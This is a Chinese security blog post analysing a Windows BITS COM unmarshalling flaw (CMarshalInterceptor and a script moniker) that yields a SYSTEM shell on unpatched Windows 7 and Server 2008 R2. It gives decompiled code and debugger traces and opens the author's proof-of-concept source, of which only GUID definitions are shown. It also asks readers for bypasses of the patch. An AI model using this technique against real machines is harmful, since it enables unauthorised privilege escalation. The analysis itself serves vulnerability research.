> 原文链接: https://www.anquanke.com//post/id/149704 


# 又一种新的btis服务com组件漏洞利用方式，成功提权至system


                                阅读量   
                                **131709**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01df3f4f38c9a665c6.jpg)](https://p4.ssl.qhimg.com/t01df3f4f38c9a665c6.jpg)



## 分析过程

poc说明：可在未打微软2018年6月份安全补丁的win7x64,server2008r2x64运行，支持webshell模式，支持任意用户运行,运行后获得一个system权限的cmd，提供poc源码和编译后的exe。我的poc仅供研究目的，如果读者利用本poc从事其他行为，与本人无关。

> 前段部分介绍com组件的marshal原理有com基础的可以略过

在windows下有个以system权限运行的Background Intelligent Transfer Service服务(简称bits)，调用bits服务的公开api中的IBackgroundCopyJob-&gt;SetNotifyInterface接口，我的利用方式是在poc中创建的类[CMarshaller]，也就是SetNotifyInterface接口的参数Interface(远程com对象)，因为这个类继承了IMarshal接口，bits为了获得这个Interface，bits最终会Unmarshal通过调用CoUnmarshalInterface

先看CoUnmarshalInterface逆向结果:

```
HRESULT __stdcall CoUnmarshalInterface(LPSTREAM pStm, const IID *const riid, IUnknown *ppv)

`{`
  HRESULT result; // eax
  CStdIdentity *hrTemp; // edi
  IUnknown *v5; // esi
  tagOBJREF objref; // [esp+14h] [ebp-5Ch]
  if ( !pStm || !ppv )
    return -2147024809;
  ppv-&gt;vfptr = 0;
  //先检查marshaler的Channe是不是建立
  result = InitChannelIfNecessary();
  if ( result &gt;= 0 )
  `{`
    hrTemp = (CStdIdentity *)ReadObjRef(pStm, &amp;objref);
    if ( (signed int)hrTemp &gt;= 0 )
    `{`
      //先获取用来UnmarshalInterface的com对象(Unmarshaler),这里我使用的是自定义CustomUnmarshaler     
      JUMPOUT(objref.flags &amp; 4, 0, &amp;CallGetCustomUnmarshaler);
      // 这里传进去bypass还是0,根据之前CallGetCustomUnmarshaler获得的Unmarshaler
      hrTemp = UnmarshalObjRef(&amp;objref, (void **)&amp;ppv-&gt;vfptr, 0, 0);
      FreeObjRef(&amp;objref);
      if ( !InlineIsEqualGUID((_GUID *)riid, &amp;GUID_NULL)
      //objref中就包含当前要Unmarshale的UnmarshalClassID=objref.iid
        &amp;&amp; !InlineIsEqualGUID((_GUID *)riid, &amp;objref.iid)
        &amp;&amp; (signed int)hrTemp &gt;= 0 )
      `{`
        v5 = (IUnknown *)ppv-&gt;vfptr;
        hrTemp = (CStdIdentity *)(*ppv-&gt;vfptr-&gt;QueryInterface)(ppv-&gt;vfptr, riid, ppv);
        ((void (__stdcall *)(IUnknown *))v5-&gt;vfptr-&gt;Release)(v5);
      `}`
    `}`
    result = (HRESULT)hrTemp;
  `}`
  return result;
`}`
```

如果调用远程com对象QueryInterface得到他支持IMarshal接口,也就是返回HRESULT=S_OK后

首先调用IMarshal接口GetUnmarshalClass方法获取类的

UnmarshalClassID，看看是不是几种ole32自带的UnmarshalClassID如果不是根据UnmarshalClassID调用CoCreateInstance创建对应的com对象来unmarshal，这个com对象必须支持IMarshal接口，然后调用这个com对象的UnmarshalInterface方法；

我的POC返回[CLSID_QCMarshalInterceptor]，也就是CMarshalInterceptor类的CLSID，这是bits服务会在自己进程创建中[CMarshalInterceptor]对应的实例，并用这个实例来UnmarshalInterface根据Stream中的数据包

```
HRESULT __stdcall GetCustomUnmarshaler(_GUID *rclsid, IStream *pStm, IMarshal **ppIM)
`{`
  if ( InlineIsEqualGUID(&amp;CLSID_StdWrapper, rclsid) || InlineIsEqualGUID(&amp;CLSID_StdWrapperNoHeader, rclsid) )
    return GetStaticWrapper(ppIM);
  JUMPOUT(InlineIsEqualGUID(&amp;CLSID_InProcFreeMarshaler, rclsid), 0, &amp;loc_725CF958);
  if ( InlineIsEqualGUID(&amp;CLSID_ContextMarshaler, rclsid) )
    return GetStaticContextUnmarshal(ppIM);
  if ( InlineIsEqualGUID(&amp;CLSID_AggStdMarshal, rclsid) )
    return FindAggStdMarshal(pStm, ppIM);
    //如果是自定义Unmarshal创建实例来UnmarshalInterface根据Stream中的数据包
  return CoCreateInstance(rclsid, 0, (gCapabilities &amp; 0x2000 | 0x806) &gt;&gt; 1, &amp;IID_IMarshal, (LPVOID *)ppIM);
`}`
```

默认以标准marshal方式，Com组件默认的标准Marshal的就是CStdIdentity继承的类CStdMarshal来Unmarshal，获得的UnmarshalCLSID是CLSID_StdMarshal或CLSID_StdWrapperNoHeader或CLSID_AggStdMarshal

```
HRESULT __stdcall CStdMarshal::GetUnmarshalClass(CStdMarshal *this, _GUID *riid, void *pv, unsigned int dwDestCtx, void *pvDestCtx, unsigned int mshlflags, _GUID *pClsid)
`{`
  GUID *v7; // esi
  unsigned __int16 *v8; // esi
//MSHCTX_INPROC =3进程内marshal 或 MSHCTX_CROSSCTX =4同进程不同套间(CObjectContext不同)模式,不支持标准marshal           
  if ( ~(unsigned __int8)this-&gt;_dwFlags &amp; 1 &amp;&amp; dwDestCtx == 4 &amp;&amp; !(mshlflags &amp; 2)
    || ~(unsigned __int8)this-&gt;_dwFlags &amp; 1 &amp;&amp; dwDestCtx == 3 &amp;&amp; IsThreadInNTA() &amp;&amp; !(mshlflags &amp; 2) )
  `{`
    v7 = &amp;CLSID_StdWrapperNoHeader;
  `}`
  else
  `{`
   //这2种都是标准marshal      
   //第一种聚合marshal 
    v7 = &amp;CLSID_AggStdMarshal;
    if ( !(this-&gt;_dwFlags &amp; 0x1000) )
      //第二种聚合的标准marshal
      v7 = &amp;CLSID_StdMarshal;
  `}`
    pClsid-&gt;Data1 = v7-&gt;Data1;
  v8 = &amp;v7-&gt;Data2;
  *(_DWORD *)&amp;pClsid-&gt;Data2 = *(_DWORD *)v8;
  v8 += 2;
  *(_DWORD *)pClsid-&gt;Data4 = *(_DWORD *)v8;
  *(_DWORD *)&amp;pClsid-&gt;Data4[4] = *((_DWORD *)v8 + 1);
  return 0;
`}`
```

//UnmarshalObjRef是CStdIdentity继承的类CStdMarshal的也就是默认的标准Unmarshal方式

```
CStdIdentity *__stdcall UnmarshalObjRef(tagOBJREF *objref, void **ppv, int fBypassActLock, CStdMarshal **ppStdMarshal)
`{`
  HRESULT hrTemp; // eax
  CObjectContext *canCallServerCtx; // eax
  tagOBJREF *objrefTemp; // edi
  CStdIdentity *hrFinal; // esi
  CStdMarshal *CStdMarshalRef; // esi
  CStdIdentity *stdity; // eax
  void **ppvRef; // edi
  tagStdUnmarshalData StdData; // [esp+Ch] [ebp-1Ch]
  int fLightNAProxy; // [esp+24h] [ebp-4h]
  objrefTemp = objref;
  // fLightNAProxy=1就是crossctx,0就是sameapt
  fLightNAProxy = CrossAptRefToNA(objref);
  hrFinal = FindStdMarshal(objrefTemp, 0, (CStdMarshal **)&amp;objref, fLightNAProxy);
  if ( (signed int)hrFinal &lt; 0 )
  `{`
    // cPublicRefs引用如果大于0,就减少引用
    if ( objrefTemp-&gt;u_objref.u_standard.std.cPublicRefs )
      ReleaseMarshalObjRef(objrefTemp);
  `}`
  else
  `{`
    CStdMarshalRef = (CStdMarshal *)objref;
    stdity = *(CStdIdentity **)objref-&gt;iid.Data4;
    StdData.pobjref = objrefTemp;
    ppvRef = ppv;
    StdData.pStdID = stdity;
    StdData.ppv = ppv;
    StdData.pClientCtx = GetCurrentContext();
    if ( ppStdMarshal )
    `{`
      *ppStdMarshal = CStdMarshalRef;
      CStdMarshalRef-&gt;_selfMyMarshal._SelfMarshalVtbl-&gt;AddRef((IUnknown *)CStdMarshalRef);
    `}`
    // 里面是判断crossctx,里面ctx是不是不同
    canCallServerCtx = CStdMarshal::ServerObjectCallable(CStdMarshalRef);
    if ( canCallServerCtx )
    `{`
      //创建CStdWrapper包装自己
      StdData.fCreateWrapper = ppvRef != 0;
      // CStdMarshal::UnmarshalObjRef调用类型不同CStdMarshal模式中fBypassActLock为0就是false,传入的默认就是0
      if ( fBypassActLock )
        hrTemp = PerformCallback(
                   canCallServerCtx,
                   (HRESULT (__stdcall *)(void *))UnmarshalSwitch,
                   &amp;StdData,
                   &amp;IID_IEnterActivityWithNoLock,
                   2u,
                   0);
      else
        hrTemp = PerformCallback(
                   canCallServerCtx,
                   (HRESULT (__stdcall *)(void *))UnmarshalSwitch,
                   &amp;StdData,
                   &amp;IID_IMarshal,
                   6u,
                   0);
    `}`
    else
    `{`
      StdData.fCreateWrapper = fLightNAProxy;
      // 最终都是调用CStdMarshal::UnmarshalObjRef
      hrTemp = UnmarshalSwitch(&amp;StdData);
    `}`
    hrFinal = (CStdIdentity *)hrTemp;
  `}`
  return hrFinal;
`}`
```

> 后段部分介绍导致poc结果执行的真正原因:

下面看下CMarshalInterceptor::UnmarshalInterface的逆向结果，首先判断数据包头和CLSID也就是CLSID_QCMarshalInterceptor

我做的结构UnmarshalInterface需要读出的头结构

```
struct MarshalInterceptorHeader
`{`
  __int16 headersig;
  __int16 headData;
  __int32 headData2;
  __int32 headData3;
  IID *BuffIID;
`}`;
union CutomMarshalInterceptorHeader
`{`
  MarshalInterceptorHeader my_Head;
  _GUID GUID_Head;
`}`;
```

逆向结果代码：

```
HRESULT __userpurge CMarshalInterceptor::UnmarshalInterface( CMarshalInterceptor *this, LPSTREAM pStm, const struct _GUID *clsidFrom, void **ppv)
`{`
  HRESULT result; // eax
  int v6; // esi
  int v8; // [esp+4h] [ebp-50h]
  __int16 v9; // [esp+8h] [ebp-4Ch] MAPDST
  int v10; // [esp+Ch] [ebp-48h]
  const wchar_t *v11; // [esp+10h] [ebp-44h]
  IID *v12; // [esp+14h] [ebp-40h]
  int v13; // [esp+18h] [ebp-3Ch]
  int v14; // [esp+1Ch] [ebp-38h]
  int v15; // [esp+20h] [ebp-34h]
  IPersistStream *IPersistStreamPPvRet; // [esp+2Ch] [ebp-28h]
  CutomMarshalInterceptorHeader Header_Clsid; // [esp+30h] [ebp-24h]
  *ppv = 0;
  if ( !pStm )
    return -2147024809;
  Header_Clsid.my_Head.headersig = 0;
  //先把第1个字节设为0
  Header_Clsid.my_Head.headersig = 0; 
  memset(&amp;Header_Clsid.my_Head.headData, 0, 0x1Cu);
  v9 = 0;
   //再读取12+16=26到Header_Clsid,前12位为sighead,后16位为CLSID=BuffIID
  result = CMkUtil::Read(pStm, &amp;Header_Clsid, 0x20u);
  if ( result &gt;= 0 )
  `{`
    if ( Header_Clsid.my_Head.headersig )
    `{`
      v14 = 0;
      v9 = 37;
      v11 = L"Version";
      v8 = -2147467259;
      v10 = -1073605911;
      v12 = (IID *)&amp;Header_Clsid;
      v13 = 32;
      v15 = 1;
       //失败记录日志
      CError::WriteToLog(
        (CError *)&amp;v8,
        L"d:\w7rtm\com\complus\src\comsvcs\qc\marshalinterceptor\marshalinterceptor.cpp",
        0x247u,
        L"Version");
      result = -2147467259;
    `}`
    //比较BuffIID和CLSID_QCMarshalInterceptor是否相同,如果相同执行 CMarshalInterceptor::CreateRecorde
    else if ( !memcmp(&amp;CLSID_QCMarshalInterceptor, &amp;Header_Clsid.my_Head.BuffIID, 0x10u) )
    `{`
      result = CMarshalInterceptor::CreateRecorder(pStm, clsidFrom, ppv);
    `}`
    else
    `{`
    //如果不相同根据BuffIID创建IPersistStream实例
      IPersistStreamPPvRet = 0;
      result = CoCreateInstance(
                 (const IID *const )&amp;Header_Clsid.my_Head.BuffIID,
                 0,
                 0x417u,
                 &amp;IID_IPersistStream,
                 (LPVOID *)&amp;IPersistStreamPPvRet);
      if ( result &gt;= 0 )
      `{`
      //调用IPersistStream实例Load方法,读取到最终结果UnmarshalInterface的ppv;
        v6 = ((int (__stdcall *)(IPersistStream *, LPSTREAM, void **))IPersistStreamPPvRet-&gt;_SelfMarshalVtbl-&gt;Load)(
               IPersistStreamPPvRet,
               pStm,
               ppvref);
        if ( v6 &gt;= 0 )
        //看看读出的ppv是否支持UnmarshalInterface传入的clsid
          v6 = IPersistStreamPPvRet-&gt;_SelfMarshalVtbl-&gt;QueryInterface(
                 (IUnknown *)IPersistStreamPPvRet,
                 clsidFrom,
                 (IUnknown *)ppv);
        ((void (__cdecl *)(IPersistStream *))IPersistStreamPPvRet-&gt;_SelfMarshalVtbl-&gt;Release)(IPersistStreamPPvRet);
        result = v6;
      `}`
    `}`
  `}`
  return result;
`}`
```

如果之前比较相同调用CMarshalInterceptor::CreateRecorder里面根据 CVE-2018-0824原理反序列化出一个Moniker,具体原因是看逆向结果是:

```
HRESULT __stdcall CMarshalInterceptor::CreateRecorder(LPSTREAM pStm, const struct _GUID *a2, IMoniker **ppvFinal)
`{`
  HRESULT v3; // esi
  int v4; // eax
  const wchar_t *v5; // eax
  unsigned int v7; // [esp-8h] [ebp-5Ch]
  wchar_t *v8; // [esp-4h] [ebp-58h]
  HRESULT v9; // [esp+14h] [ebp-40h]
  __int16 v10; // [esp+18h] [ebp-3Ch]
  int v11; // [esp+1Ch] [ebp-38h]
  const wchar_t *v12; // [esp+20h] [ebp-34h]
  int v13; // [esp+24h] [ebp-30h]
  int v14; // [esp+28h] [ebp-2Ch]
  int v15; // [esp+2Ch] [ebp-28h]
  int v16; // [esp+30h] [ebp-24h]
  LPSTREAM streamRef; // [esp+34h] [ebp-20h]
  LPBC ppbc; // [esp+38h] [ebp-1Ch]
  IMoniker *ppvMonikerRet; // [esp+3Ch] [ebp-18h]
  CLSID pclsid; // [esp+40h] [ebp-14h]
  *ppvFinal = 0;
  pclsid.Data1 = 0;
  *(_DWORD *)&amp;pclsid.Data2 = 0;
  *(_DWORD *)pclsid.Data4 = 0;
  *(_DWORD *)&amp;pclsid.Data4[4] = 0;
  streamRef = pStm;
  ppvMonikerRet = 0;
  ppbc = 0;
  //从流中读出Moniker的GUID(pclsid))
  v3 = ReadClassStm(pStm, &amp;pclsid);
  if ( v3 &gt;= 0 )
  `{`
  //判断是GUID是不是复合的Moniker(CompositeMoniker的GUID)),如果是加载复合moniker不是加载当前moniker
    v4 = !memcmp(CLSID_CompositeMoniker, &amp;pclsid, 0x10u) ? CMarshalInterceptor::LoadCompositeMoniker(
                                                             streamRef,
                                                             &amp;ppvMonikerRet) : CMarshalInterceptor::LoadNonCompositeMoniker(
                                                                                 streamRef,
                                                                                 &amp;pclsid,
                                                                                 (LPVOID *)&amp;ppvMonikerRet);
    v3 = v4;
    if ( v4 &gt;= 0 )
    `{`
      v3 = CreateBindCtx(0, &amp;ppbc);
      if ( v3 &gt;= 0 )
      `{`
        读出moniker后并调用它的BindToObject方法,会启动moniker中的sct脚本
        v3 = ppvMonikerRet-&gt;lpVtbl-&gt;BindToObject(ppvMonikerRet, ppbc, 0, a2, (void **)ppvFinal);
        if ( v3 &gt;= 0 )
          goto LABEL_11;
        v10 = 37;
        v5 = L"BindToObject";
        v8 = L"BindToObject";
        v11 = -1073605911;
        v7 = 832;
      `}`
      else
      `{`
        v10 = 37;
        v5 = L"CreateBindCtx";
        v8 = L"CreateBindCtx";
        v11 = -1073606062;
        v7 = 821;
      `}`
      v12 = v5;
      v9 = v3;
      v13 = 0;
      v14 = 0;
      v15 = 0;
      v16 = 1;
      //失败记录日志
      CError::WriteToLog(
        (CError *)&amp;v9,
        L"d:\w7rtm\com\complus\src\comsvcs\qc\marshalinterceptor\marshalinterceptor.cpp",
        v7,
        v8);
    `}`
  `}`
LABEL_11:
  if ( ppvMonikerRet )
  `{`
    ppvMonikerRet-&gt;lpVtbl-&gt;Release(ppvMonikerRet);
    ppvMonikerRet = 0;
  `}`
  if ( ppbc )
    ppbc-&gt;lpVtbl-&gt;Release(ppbc);
  return v3;
`}`
```

//如果是复合Moniker就直接从流中读出Moniker,需要读2次,原因具体看逆向结果

```
int __stdcall CMarshalInterceptor::LoadCompositeMoniker(LPSTREAM pStm, struct IMoniker **ppvMonikerRet)
`{`
  struct IMoniker **v2; // esi
  int result; // eax
  v2 = a2;
  *buff = 0;
  buff = 0;
  result = CMkUtil::Read(pStm, &amp;buff, 4u);
  if ( result &gt;= 0 )
  `{`
    如果读出的buff是02再次调用自身函数从流中读出ppvMonikerRet,这也就是流中要先写入02的原因
    if ( (unsigned int)buff &gt;= 2 )
      result = CMarshalInterceptor::LoadAndCompose(pStm, (unsigned int)buff, ppvMonikerRet);
    else
      result = -2147418113;
  `}`
  return result;
`}`
```

如果不是复合Moniker就调用LoadNonCompositeMoniker就是通过moniker的CLSID创建一个新的moniker，逆向结果

```
HRESULT __stdcall CMarshalInterceptor::LoadNonCompositeMoniker(struct IStream *a1, IID *rclsid, LPVOID *ppv)
`{`
  HRESULT result; // eax
//调用CoCreateInstance创建一个新的monike
  result = CoCreateInstance(rclsid, 0, 0x415u, &amp;IID_IMoniker, ppv);
  if ( result &gt;= 0 )
    result = (*(int (__stdcall **)(LPVOID, struct IStream *))(*(_DWORD *)*ppv + 20))(*ppv, a1);
  return result;
`}`
```

由于最新6月补丁在CMarshalInterceptor::UnmarshalInterface加入了验证判断需要验证tls所以直接返回错误，如果有读者发现绕过方法可以联系我

```
if  (  !*(_BYTE  *)(*(_QWORD  *)(__readgsqword(0x58u)  +  8i64  *  (unsigned  int)tls_index)  +  1i64)  )
    `{`
        v8  =  -2147024891;
        v9  =  L"PlayerUnmarshaling";
        v21  =  0i64;
        v22  =  0i64;
        v10  =  567;
LABEL_21:
        v17  =  v8;
        v19  =  -1073605911;
        v20  =  v9;
        v18  =  37;
        v23  =  0;
        v24  =  1;
        CError::WriteToLog(
            (CError  *)&amp;v17,
            L"d:\w7rtm\com\complus\src\comsvcs\qc\marshalinterceptor\marshalinterceptor.cpp",
            v10,
            v9);
        return  v8;
    `}`
```

> <p>调试poc:<br>
成功在CMarshalInterceptor::UnmarshalInterface:断下</p>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a490365203576274.png)Breakpoint 0 hit<br>
comsvcs!CMarshalInterceptor::UnmarshalInterface:<br>
000007ff7c0cb420 48895c2408 mov qword ptr [rsp+8],rbx ss:00000000011fe7d0=0000000000000000

windbg在scrobj模块加载时断下，截图<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0164f6ad51fa6d2330.png)

再次成功在kernel32!CreateProcessW:断下<br>
0:003&gt; g<br>
Breakpoint 1 hit<br>
kernel32!CreateProcessW:<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015601f6b7c3aa9ffb.png)

查看栈回溯

```
00000000`78d405e0 e91b055587      jmp     00000000`00290b00
0:006&gt; kb L100
RetAddr           : Args to Child                                                           : Call Site
000007ff`2c07bfb4 : 00000000`00000000 000007ff`71f81982 00000d33`48538180 00000000`00000000 : kernel32!CreateProcessW
000007ff`2c07c463 : 00000000`00000000 00000000`0172d590 00000000`0172d590 00000000`0172d3d0 : wshom!CWshShell::CreateShortcut+0x310
000007ff`76881760 : 00000000`0172d5a8 00000000`008b2a4c 00000000`0024e078 00000000`00000000 : wshom!CWshShell::Exec+0x2b3
000007ff`76882582 : 000007ff`fffd4000 000007ff`76923a00 00000000`00000fff 000007ff`76882468 : OLEAUT32!DispCallFuncAmd64+0x60
000007ff`7688206a : 00000000`00250cb8 00000000`01ff5d28 00000000`00228570 00000000`00000000 : OLEAUT32!DispCallFunc+0x268
000007ff`2c0712c9 : 00000000`00a3f960 000007ff`768815cc 00000000`00211970 00000000`00000002 : OLEAUT32!CTypeInfo2::Invoke+0x3aa
000007ff`2c071211 : 000007ff`2c0711c4 00000000`00000208 00000000`00001f80 000007ff`756a26e8 : wshom!CDispatch::Invoke+0xad
00000000`0195860a : 00000000`00001f80 00000000`00010000 00000000`00000000 00000000`0172da10 : wshom!CWshEnvProcess::Invoke+0x4d
00000000`01959852 : 000007ff`fff40000 00000000`0172dac0 00000000`008aad50 00000000`0172e210 : jscript!VAR::InvokeByName+0x674
00000000`01959929 : 00000000`00000001 00000000`008aad50 00000000`00004000 00000000`008aad50 : jscript!VAR::InvokeDispName+0x72
00000000`019524b8 : 00000000`008add40 00000000`008b2bc2 00000000`0172eac0 00000000`00000001 : jscript!VAR::InvokeByDispID+0x1229
00000000`01958ec2 : 00000000`00000000 00000000`0172eac0 00000000`00000000 00000000`008ae710 : jscript!CScriptRuntime::Run+0x5a6
00000000`01958d2b : 00000000`008aa330 00000000`00000000 00000000`00000000 00000000`00000000 : jscript!ScrFncObj::CallWithFrameOnStack+0x162
00000000`01958b95 : 00000000`008aad50 00000000`008aad50 00000000`00000000 00000000`00a3f5a0 : jscript!ScrFncObj::Call+0xb7
00000000`0195e6b0 : 00000000`0008001f 00000000`00a3f5a0 00000000`008ad030 00000000`00000000 : jscript!CSession::Execute+0x19e
00000000`01951cb5 : 00000000`00000000 00000000`00a3f5a0 00000000`00000000 00000000`00000000 : jscript!COleScript::ExecutePendingScripts+0x17a
000007ff`30cc7186 : 00000000`008aa828 00000000`00000001 00000000`008ad030 00000000`4640f6a8 : jscript!COleScript::SetScriptState+0x61
000007ff`30cc7004 : 00000000`008ab3c0 00000000`008ab3c0 00000000`008a8160 00000000`008a8160 : scrobj!ComScriptlet::Inner::StartEngines+0xcf
000007ff`30cc6dc1 : 00000000`008aca40 00000000`008ab3c0 00000000`008a8160 00000000`00000000 : scrobj!ComScriptlet::Inner::Init+0x27a
000007ff`30cc6caa : 00000000`008a8160 00000000`00000000 00000000`00000000 00000000`00000000 : scrobj!ComScriptlet::New+0xca
000007ff`30cd1198 : 00000000`0172f440 00000000`01fc3580 00000000`00a3ef00 00000000`002574b8 : scrobj!ComScriptletConstructor::Create+0x68
000007ff`30cc1e33 : 00000000`0172f440 00000000`002535d0 00000000`00230d60 00000000`0172f440 : scrobj!ComScriptletFactory::CreateInstanceWithContext+0x240
000007ff`7a75f587 : 00000000`0172f320 000007ff`7a784060 00000000`0172f450 00000000`00000001 : scrobj!ComBuiltInFactory::CreateInstance+0x17
000007ff`7a623dbd : 00000000`0172f440 000007ff`7a788400 00000000`0172f440 000007ff`7a784030 : ole32!IClassFactory_CreateInstance_Stub+0x1b
000007ff`7febbb46 : 00000000`00000003 00000000`002535d0 000007ff`7a784048 00000000`00230d60 : ole32!IClassFactory_RemoteCreateInstance_Thunk+0x1d
000007ff`7fe10e76 : 00000000`00a3ef00 00000000`00000002 00000000`00a3f460 00000000`00000000 : RPCRT4!Ndr64StubWorker+0x761
000007ff`7a75d443 : 00000000`00000000 00000000`00000000 000007ff`7a791400 00000000`00208610 : RPCRT4!NdrStubCall3+0xb5
000007ff`7a75dcb9 : 00000000`00000001 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!CStdStubBuffer_Invoke+0x5b
000007ff`7a75dc46 : 00000000`00230d60 00000000`011fe2b4 00000000`0022f950 000007ff`30ce7280 : ole32!SyncStubInvoke+0x5d
000007ff`7a61712f : 00000000`00230d60 00000000`00211970 00000000`002535d0 00000000`008ab250 : ole32!StubInvoke+0x185
000007ff`7a74fbf6 : 00000000`00000000 00000000`011fe2b4 00000000`01fadf50 00000000`002574b8 : ole32!CCtxComChnl::ContextInvoke+0x186
000007ff`7a62ea49 : 000007ff`7a76edd8 00000000`00000000 000007ff`7a7c3ca8 00000000`00205cc0 : ole32!MTAInvoke+0x26
000007ff`7a75d85c : 00000000`00211970 00000000`00000000 00000000`01fadf50 00000000`00230cd0 : ole32!STAInvoke+0x96
000007ff`7a75db6f : 00000000`d0908070 00000000`00211970 00000000`00000000 00000000`00214d00 : ole32!AppInvoke+0xe1
000007ff`7a75f872 : 00000000`00230cd0 00000000`00000400 00000000`00000000 00000000`00211d70 : ole32!ComInvokeWithLockAndIPID+0x4c1
000007ff`7a627059 : 00000000`00204288 00000000`00208610 00000000`00000000 00000000`00230cd0 : ole32!ComInvoke+0xae
000007ff`7a636d88 : 00000000`00211970 00000000`00230cd8 00000000`00000400 00000000`00000000 : ole32!ThreadDispatch+0x29
00000000`78c39bbd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!ThreadWndProc+0x163
00000000`78c398c2 : 00000000`0172fe70 000007ff`7a626d68 000007ff`7a7bf7c0 00000000`00976fa0 : USER32!UserCallWinProcCheckWow+0x1ad
000007ff`7a626d0a : 00000000`000400ba 00000000`000400ba 000007ff`7a626d68 00000000`00000000 : USER32!DispatchMessageWorker+0x3b5
000007ff`7a74f5a7 : 00000000`00211970 00000000`00000000 00000000`00211970 000007ff`7a610c74 : ole32!CDllHost::STAWorkerLoop+0x68
000007ff`7a60380e : 00000000`00211970 00000000`00205540 00000000`00000000 00000000`00000000 : ole32!CDllHost::WorkerThread+0xd7
000007ff`7a5ff65a : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!CRpcThread::WorkerLoop+0x1e
00000000`78d359cd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!CRpcThreadCache::RpcWorkerThreadEntry+0x1a
00000000`78e7a561 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0xd
00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x1d
```

最后触发最终结果的原因是 v3 = ppvMonikerRet-&gt;lpVtbl-&gt;BindToObject(ppvMonikerRet, ppbc, 0, a2, (void **)ppvFinal);

这个ppvMonikerRet就是我poc中创建的Moniker,它有一个Displayname,也就是我poc生成的sct文件,即script:xxx.sct,bits然后调用它的BindToObject方法会加载windows中scrobj.dll生成scriptmoniker并执行sct脚本,最终以bits自身权限启动一个cmd,如图,<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012687b9de02a601d9.png)

> 我的poc源码:

```
//myguid
GUID IID_Imytestcom = `{` 0xE80A6EC1, 0x39FB, 0x462A, `{` 0xA5, 0x6C, 0x41, 0x1E, 0xE9, 0xFC, 0x1A, 0xEB `}` `}`;
GUID IID_ITMediaControl = `{` 0xc445dde8, 0x5199, 0x4bc7, `{` 0x98, 0x07, 0x5f, 0xfb, 0x92, 0xe4, 0x2e, 0x09 `}` `}`;
//ole32guid
GUID CLSID_AggStdMarshal2 = `{` 0x00000027, 0x0000, 0x0008, `{` 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
GUID CLSID_FreeThreadedMarshaller = `{` 0x0000033A, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
GUID CLSID_StubMYTestCom = `{` 0x00020424, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, `}` `}`;
GUID IID_IStdIdentity = `{` 0x0000001b, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
GUID IID_IMarshalOptions = `{` 0X4C1E39E1, 0xE3E3, 0x4296, `{` 0xAA, 0x86, 0xEC, 0x93, 0x8D, 0x89, 0x6E, 0x92 `}` `}`;
GUID CLSID_DfMarshal = `{` 0x0000030B, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
GUID IID_IStdFreeMarshal = `{` 0x000001d0, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
//GUID IID_IStdMarshalInfo = `{` 0x00000018, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,`}` `}`;
//GUID IID_IExternalConnection = `{` 0x00000019, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,`}` `}`;
//GUID  IID_IStdFreeMarshal = `{` 0x000001d0, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
//GUID IID_IProxyManager = `{` 0x00000008, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
GUID  CLSID_StdWrapper = `{` 0x00000336, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
GUID  CLSID_StdWrapperNoHeader = `{` 0x00000350, 0x0000, 0x0000, `{` 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
